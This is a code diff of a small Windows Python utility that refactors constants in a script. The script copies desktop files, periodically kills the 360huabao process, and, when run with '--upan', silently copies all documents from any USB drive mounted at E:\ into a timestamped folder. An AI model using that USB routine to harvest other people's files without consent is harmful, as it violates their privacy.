@@ -2,7 +2,13 @@
 #deskcopy 桌面拖入文件自动复制 v1.0_1
 #2022.11.18-2022.12.10
 
-TARGET = 'D:\\desktop'
+TARGET = 'D:\\desktop'  #复制目标
+ALLOW_SUFFIX = ('.doc','.docx','.ppt','.pptx','.pdf')   #过滤后缀名时允许的类型
+LOGFILE = 'deskcopy.log'    #日志文件
+UPACOPY_ARGV = '--upan' #U盘全盘复制启动参数
+DESKSLEEP = 5   #桌面复制间隔时间
+UPANSLEEP = 60  #U盘检测间隔时间
+KILL360SLEEP = 60   #杀死360画报间隔时间
 
 import os,time,shutil,sys,threading
 
@@ -10,8 +16,9 @@ os.chdir(os.path.join(os.path.expanduser('~'),'Desktop'))
 filenum = len(os.listdir())
 
 def execute_with_arg():
+    '''使用参数启动'''
     if len(sys.argv) == 2:
-        if sys.argv[1] == '--upan':
+        if sys.argv[1] == UPACOPY_ARGV:
             upan()
             sys.exit()
         else:
@@ -51,7 +58,7 @@ def main():
 def upan(): #※不可在Linux下测试
     global TARGET
     while not os.path.exists('E:\\'):
-        time.sleep(60)
+        time.sleep(UPANSLEEP)
     os.chdir('E:\\')
     TARGET = os.path.join(TARGET,time.strftime('%Y%m%d%H%M%S'))
     os.mkdir(TARGET)
@@ -86,7 +93,7 @@ isfilter(bool):是否过滤后缀名'''
         for j in i[2]:
             filesrc = os.path.join(i[0],j)
             suffix = os.path.splitext(filesrc)[-1]
-            if (suffix in ('.doc','.docx','.ppt','.pptx','.pdf')) or (not isfilter):
+            if (suffix in ALLOW_SUFFIX) or (not isfilter):
                 filetarget = os.path.join(target,j)
                 try:
                     shutil.copy(filesrc,filetarget)
@@ -98,9 +105,10 @@ isfilter(bool):是否过滤后缀名'''
             else:
                 print(f'已跳过 {filesrc} at {time.strftime("%Y.%m.%d %H:%M:%S")}')
 def kill360():
+    '''自动杀死360画报'''
     while True:
         os.popen('taskkill /f /im 360huabao.exe').close()
-        time.sleep(60)
+        time.sleep(KILL360SLEEP)
 def main():
     execute_with_arg()
     print(f'已于 {time.strftime("%Y.%m.%d %H:%M:%S")} 启动')
@@ -108,7 +116,7 @@ def main():
     while True:
         if is_file_number_change():
             copy('.',TARGET,isfilter=False)
-        time.sleep(5)
+        time.sleep(DESKSLEEP)
 
 if __name__ == '__main__':
     main()
